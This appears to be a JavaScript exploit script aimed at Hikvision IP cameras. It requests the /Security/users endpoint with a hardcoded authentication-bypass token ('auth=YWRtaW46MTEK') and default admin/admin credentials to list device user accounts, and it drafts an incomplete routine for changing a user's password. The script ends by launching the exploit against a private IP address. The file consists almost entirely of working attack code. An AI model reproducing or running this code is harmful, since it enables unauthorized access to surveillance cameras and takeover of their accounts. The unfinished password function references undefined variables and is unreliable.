var errorMessage = 'Could not execute exploit.'

function httpGet(url, callback) {
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = false;
    xhr.open("GET", url, true, "admin", "admin");
    xhr.onreadystatechange = (function processRequest(e) {
        if( xhr.readyState == 4 && xhr.status == 200) {
            return callback(xhr.responseText);
        }
        else if(xhr.status >= 400){
            return callback(errorMessage);
        }
    });
    xhr.send();
}


function hikvisionGetUserList(ip, callback) {
    var userList = []; //YWRtaW46MTEK
    httpGet("http://" + ip + "/Security/users?auth=YWRtaW46MTEK", function returned(response){
        if(response != errorMessage) {
            var parser = new DOMParser();
            var xmlDoc;
            xmlDoc = parser.parseFromString(response,"text/xml").getElementsByTagName("UserList");
            for (i = 0; i < xmlDoc.length; i++) {
                userList.push(xmlDoc[i].getElementsByTagName("userName")[0].innerHTML);
            }
            return callback(userList);
        }
        return callback(errorMessage);
    });
}


function hikvisionChangeUserPassword(ip, callback) {
    var userXml = 
    '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\
        <id>"' + "" + '"</id>\
        <userName>"' + userName + '"</userName>\
        <password>"' + txtNewPW.Text + '"</password>\
    </User>';
    var parser = new DOMParser();
    var xmlDoc = parser.parseFromString(userXml,"text/xml");
    console.log(xmlDoc);
}



function exploit(ip) {
    hikvisionGetUserList(ip, function returned(userList) {
        if(userList != errorMessage) {
            console.log(userList);

        }
        return errorMessage
    });
}


exploit("172.16.0.229");